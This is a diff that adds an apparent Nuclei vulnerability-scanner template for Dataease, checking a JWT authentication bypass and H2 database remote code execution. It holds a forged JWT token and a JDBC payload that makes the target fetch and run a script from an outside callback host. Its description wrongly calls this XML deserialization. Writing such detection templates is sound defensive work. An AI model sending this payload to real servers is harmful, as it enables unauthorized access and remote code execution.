@@ -1,0 +1,61 @@
+id: dataease-cve-2025-49002
+
+info:
+  name: "Dataease JWT认证绕过及H2数据库RCE漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for vulnerabilities in Dataease including JWT authentication bypass (CVE-2025-49001) and H2 database remote code execution (CVE-2025-49002).
+    It evaluates both access to sensitive endpoints and the exploitation of XML deserialization using crafted payloads.
+  tags: dataease
+  
+variables:
+  reverse: '{{interactsh-url}}'
+  t1: |
+    {
+      "dataBase": "",
+      "jdbc": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;init=RUNSCRIPT FROM 'http://{{reverse}}'",
+      "urlType": "jdbcUrl",
+      "sshType": "password",
+      "extraParams": "",
+      "username": "123",
+      "password": "123",
+      "host": "",
+      "authMethod": "",
+      "port": 0,
+      "initialPoolSize": 5,
+      "minPoolSize": 5,
+      "maxPoolSize": 5,
+      "queryTimeout": 30
+    }
+  t2: '{{base64(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - /de2api/datasource/validate
+    headers:
+      X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
+      Content-Type: application/json
+    body: |
+      {
+          "id": "",
+          "name": "11",
+          "description": "",
+          "type": "h2",
+          "apiConfiguration": [],
+          "paramsConfiguration": [],
+          "enableDataFill": false,
+          "configuration": "{{t2}}"
+      }
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "java.io.IOException"
+          - "\"code\":40001"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
